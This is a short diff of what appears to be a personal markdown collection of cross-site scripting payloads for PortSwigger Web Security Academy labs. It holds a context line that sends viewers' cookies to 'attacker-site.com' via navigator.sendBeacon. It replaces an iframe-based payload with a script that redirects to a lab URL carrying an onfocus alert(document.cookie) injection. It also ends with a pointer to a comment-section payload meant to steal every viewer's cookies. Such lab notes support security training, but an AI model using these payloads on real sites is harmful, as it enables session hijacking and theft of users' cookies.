@@ -37,7 +37,9 @@ navigator.sendBeacon('https://attacker-site.com/steal-cookies', 'cookie=' + enco
 
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
 
-<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+<script>
+location='https://kek.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
+</script>
 ```
 --------------------------------------------
 #### post this in the comment section - it will send all cookies for all viewers this comment:
